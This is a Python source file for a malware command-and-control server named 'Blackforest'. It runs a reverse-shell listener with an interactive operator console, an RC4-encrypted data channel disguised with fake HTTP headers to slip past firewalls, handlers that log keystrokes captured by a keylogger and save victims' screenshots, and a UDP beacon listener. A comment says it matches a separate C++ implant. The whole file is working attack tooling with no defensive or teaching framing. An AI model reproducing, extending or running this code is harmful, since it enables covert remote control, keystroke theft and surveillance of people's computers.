import socket
import threading
import time
import sys
import os
import datetime
import logging
import base64

# ==========================================
# CONFIGURATION
# ==========================================
HOST = '0.0.0.0'
SHELL_PORT = 4445
DATA_PORT = 4444
UDP_PORT = 9999
LOG_FILE = "blackforest_logs.txt"

# Logging Setup
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(message)s')

# Sessions
sessions = [] # List of {"client": socket, "addr": (ip, port)}

# ==========================================
# CRYPTOGRAPHY (RC4)
# ==========================================
class RC4:
    def __init__(self, key):
        self.S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + self.S[i] + key[i % len(key)]) % 256
            self.S[i], self.S[j] = self.S[j], self.S[i]
        self.i = 0
        self.j = 0

    def crypt(self, data):
        out = []
        for char in data:
            self.i = (self.i + 1) % 256
            self.j = (self.j + self.S[self.i]) % 256
            self.S[self.i], self.S[self.j] = self.S[self.j], self.S[self.i]
            out.append(char ^ self.S[(self.S[self.i] + self.S[self.j]) % 256])
        return bytes(out)

# ==========================================
# DATA HANDLER (Port 4444)
# ==========================================
def handle_data_client(client, addr):
    # Key: DEADBEEF... (Matches C++ Key)
    key = bytes([0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE])
    cipher = RC4(key)
    buffer = ""
    
    try:
        while True:
            data = client.recv(4096)
            if not data: break
            
            # 1. Strip Fake HTTP Headers (Firewall Bypass)
            try:
                eoh = data.find(b'\r\n\r\n')
                if eoh != -1:
                     data = data[eoh+4:] 
            except: pass
            
            # 2. Decrypt
            data = cipher.crypt(data)
            if not data: break
            
            decoded = data.decode('utf-8', errors='ignore')
            
            # 3. Process
            if "SCREENSHOT[" in decoded:
                 process_screenshot(decoded, data, client, cipher, addr)
            elif "[KEYLOG]:" in decoded:
                 log_entry = decoded.replace("[KEYLOG]: ", "")
                 print(log_entry, end='', flush=True)
                 logging.info(log_entry.strip())
            else:
                 print(decoded, end='', flush=True)
                 if decoded.strip(): logging.info(decoded.strip())
                 
    except Exception as e:
        # print(f"[!] Data Error: {e}")
        pass
    finally:
        client.close()

def process_screenshot(decoded, data, client, cipher, addr):
    try:
        start_idx = decoded.find("SCREENSHOT[")
        end_idx = decoded.find("]:", start_idx)
        if start_idx != -1 and end_idx != -1:
            size_str = decoded[start_idx+11 : end_idx]
            total_size = int(size_str)
            
            raw_header = f"SCREENSHOT[{size_str}]:".encode('utf-8')
            header_pos = data.find(raw_header)
            
            collected_data = data[header_pos + len(raw_header):]
            collected_len = len(collected_data)
            
            print(f"\n[*] Receiving Screenshot ({total_size} bytes) from {addr[0]}...")
            
            while collected_len < total_size:
                chunk = client.recv(4096)
                if not chunk: break
                chunk = cipher.crypt(chunk)
                if not chunk: break
                collected_data += chunk
                collected_len += len(chunk)
            
            timestamp = int(time.time())
            filename = f"screenshot_{addr[0]}_{timestamp}.jpg"
            
            img_bytes = base64.b64decode(collected_data)
            with open(filename, "wb") as img_file:
                img_file.write(img_bytes)
            print(f"[+] SCREENSHOT SAVED: {filename}")
            logging.info(f"SCREENSHOT SAVED: {filename}")
    except Exception as e:
        print(f"[!] Screenshot Error: {e}")

def start_data_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((HOST, DATA_PORT))
        server.listen(5)
        print(f"[*] Encrypted Data Listener: {DATA_PORT}")
        
        while True:
            client, addr = server.accept()
            t = threading.Thread(target=handle_data_client, args=(client, addr), daemon=True)
            t.start()
    except OSError:
        print(f"[!] Data Port {DATA_PORT} busy.")

# ==========================================
# UDP BEACON HANDLER (Port 9999)
# ==========================================
def start_udp_listener():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind((HOST, UDP_PORT))
        print(f"[*] UDP Beacon Listener: {UDP_PORT}")
        while True:
            data, addr = sock.recvfrom(1024)
            print(f"\n[+] BEACON RECEIVED from {addr[0]}: {len(data)} bytes")
    except OSError:
        print(f"[!] UDP Port {UDP_PORT} busy.")

# ==========================================
# SHELL HANDLER (Port 4445)
# ==========================================
def accept_shell_connections():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind((HOST, SHELL_PORT))
        server.listen(5)
        print(f"[*] Reverse Shell Listener: {SHELL_PORT}")
        
        while True:
            client, addr = server.accept()
            sessions.append({"client": client, "addr": addr})
            print(f"\n[+] New Shell Session ({len(sessions)-1}) from {addr[0]}")
            print("C2> ", end="", flush=True) 
    except OSError:
        print(f"[!] Shell Port {SHELL_PORT} busy.")

# ==========================================
# INTERFACE
# ==========================================
def interact(session_id):
    if session_id < 0 or session_id >= len(sessions):
        print("[-] Invalid Session ID")
        return
        
    target = sessions[session_id]
    client = target["client"]
    addr = target["addr"]
    
    print(f"[*] Entering Shell {session_id} ({addr[0]}). Type 'back' to return.")
    
    stop_event = threading.Event()
    
    def recv_loop():
        while not stop_event.is_set():
            try:
                data = client.recv(4096)
                if not data: 
                    stop_event.set()
                    break
                print(data.decode('utf-8', errors='ignore'), end='', flush=True)
            except: break
                
    t = threading.Thread(target=recv_loop, daemon=True)
    t.start()
    
    while not stop_event.is_set():
        try:
            cmd = input("")
            if cmd.strip() == "back":
                stop_event.set()
                print("[*] Backgrounding session...")
                break
            client.send((cmd + "\n").encode('utf-8'))
        except: break

def main():
    print(f"[*] Blackforest Team Server Started")
    print("[*] Logs: " + LOG_FILE)
    
    # Start Threads
    threading.Thread(target=accept_shell_connections, daemon=True).start()
    threading.Thread(target=start_data_listener, daemon=True).start()
    threading.Thread(target=start_udp_listener, daemon=True).start()
    
    # Main Loop
    while True:
        try:
            cmd = input("C2> ").strip().split()
            if not cmd: continue
            
            if cmd[0] == "list":
                print("\n--- Active Shell Sessions ---")
                for i, s in enumerate(sessions):
                    try:
                        # Check alive
                        s["client"].setblocking(False)
                        try:
                            if s["client"].recv(1, socket.MSG_PEEK) == b'': raise Exception
                        except BlockingIOError: pass
                        s["client"].setblocking(True)
                        print(f"[{i}] {s['addr'][0]}:{s['addr'][1]}")
                    except:
                        print(f"[{i}] {s['addr'][0]} (DEAD)")
                print("-----------------------------")
                
            elif cmd[0] == "interact":
                if len(cmd) < 2: print("Usage: interact <id>")
                else: interact(int(cmd[1]))
            
            elif cmd[0] == "help":
                print("Commands: list, interact <id>, exit")
                
            elif cmd[0] == "exit":
                print("[*] Shutting down...")
                os._exit(0) 
                
        except KeyboardInterrupt: break
        except Exception as e: print(f"[-] Error: {e}")

if __name__ == "__main__":
    main()
